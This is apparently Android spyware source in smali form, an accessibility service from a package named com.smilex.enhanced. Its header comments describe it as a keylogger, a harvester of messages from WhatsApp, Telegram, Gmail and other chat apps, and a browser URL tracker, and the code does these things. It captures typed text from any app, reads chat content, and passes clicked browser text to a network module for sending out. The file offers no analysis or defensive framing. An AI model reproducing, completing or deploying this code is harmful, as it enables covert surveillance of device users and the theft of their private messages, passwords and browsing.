.class public Lcom/smilex/enhanced/services/AccessibilityMonitorService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "AccessibilityMonitorService.java"

# Enhanced Accessibility Service - ported from hwapp391 hw/imreader/ReaderAccessibilityService.java
# Handles:
#   1. Per-app IM message extraction (WhatsApp, Telegram, Instagram, Facebook, Viber, Skype, VK, Gmail, DeepSeek, Grok)
#   2. Keylogger (typed text from any app via TYPE_VIEW_TEXT_CHANGED)
#   3. Browser URL capture (Chrome, Firefox, Samsung, Opera, Brave, etc.)
#   4. Window state tracking (current foreground app)

.field private static sCurrentPackage:Ljava/lang/String;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 12
    if-eqz p1, :return_void

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v0

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v1
    if-eqz v1, :return_void
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;
    move-result-object v2

    # TYPE_WINDOW_STATE_CHANGED = 32 (0x20): track foreground app
    const/16 v3, 0x20
    if-ne v0, v3, :not_window_state
    sput-object v1, Lcom/smilex/enhanced/services/AccessibilityMonitorService;->sCurrentPackage:Ljava/lang/String;
    goto :return_void
    :not_window_state

    # Extract text string
    if-eqz v2, :no_text
    invoke-interface {v2}, Ljava/util/List;->isEmpty()Z
    move-result v3
    if-nez v3, :no_text
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v3
    goto :has_text
    :no_text
    const/4 v3, 0x0
    :has_text

    # TYPE_VIEW_TEXT_CHANGED = 16 (0x10): keylogger + IM
    const/16 v4, 0x10
    if-ne v0, v4, :not_text_changed
    if-eqz v3, :return_void
    invoke-static {v1, v3}, Lcom/smilex/enhanced/modules/KeyloggerModule;->onTextChanged(Ljava/lang/String;Ljava/lang/String;)V
    invoke-static {v1}, Lcom/smilex/enhanced/modules/IMReaderModule;->isIMApp(Ljava/lang/String;)Z
    move-result v4
    if-eqz v4, :return_void
    invoke-static {v1, v3, v0}, Lcom/smilex/enhanced/modules/IMReaderModule;->processIMEvent(Ljava/lang/String;Ljava/lang/String;I)V
    goto :return_void
    :not_text_changed

    # TYPE_WINDOW_CONTENT_CHANGED = 2048 (0x800): IM content updates
    const/16 v4, 0x800
    if-ne v0, v4, :not_content_changed
    if-eqz v3, :return_void
    invoke-static {v1}, Lcom/smilex/enhanced/modules/IMReaderModule;->isIMApp(Ljava/lang/String;)Z
    move-result v4
    if-eqz v4, :return_void
    invoke-static {v1, v3, v0}, Lcom/smilex/enhanced/modules/IMReaderModule;->processIMEvent(Ljava/lang/String;Ljava/lang/String;I)V
    goto :return_void
    :not_content_changed

    # TYPE_VIEW_CLICKED = 1: browser URL capture
    const/4 v4, 0x1
    if-ne v0, v4, :return_void
    if-eqz v3, :return_void
    const-string v4, "browser_url"
    new-instance v5, Ljava/lang/StringBuilder;
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
    const-string v6, "["
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v6, "] "
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v5
    invoke-static {v4, v5}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    :return_void
    return-void
.end method

.method public onInterrupt()V
    .registers 1
    invoke-static {}, Lcom/smilex/enhanced/modules/KeyloggerModule;->flush()V
    return-void
.end method

.method public onServiceConnected()V
    .registers 1
    invoke-super {p0}, Landroid/accessibilityservice/AccessibilityService;->onServiceConnected()V
    return-void
.end method
